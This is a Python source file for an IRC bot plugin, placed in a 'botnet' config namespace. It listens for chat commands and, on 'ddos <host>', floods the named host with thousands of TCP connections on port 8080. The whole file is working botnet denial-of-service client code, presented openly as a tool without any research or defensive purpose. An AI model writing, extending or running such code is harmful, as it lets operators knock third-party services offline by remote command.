import os
import socket

import threading

from .. import BaseResponder


class Toast(BaseResponder):
	config_namespace = 'botnet'
	config_name = 'toast'

	def get_all_commands(self):
		rw = super(Toast, self).get_all_commands()
		try:
			for command in self.config['module_config'][self.config_namespace][self.config_name].keys():
				rw.append(command)
		except Exception as e:
			print(e)
		return rw

	def handle_privmsg(self, msg):
		if self.is_command(msg):
			command = (str(msg).split('!')[-1])
			print('>>> COMMAND RECEIVED: %s' % command)
			self.respond(msg, command + ' OK!')
			cmd = command.split()
			if cmd[0] == 'ddos' and cmd[1]:
				# threading.Thread(target=self.dudos, kwargs={'host':cmd[1]}).start()
				self.dudos(sock=msg, host=cmd[1])
			elif cmd[0] == 'quit':
				self.respond(msg, 'Bye!')
				exit()

	def dudos(self, host='127.0.0.1', port=8080, times=10000, sock=None):
		self.respond(sock, 'Dudos in progress...')
		for _ in range(times):
			print('.')
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect((host, port))
			sock.send(b'hello')
			sock.close()

mod = Toast
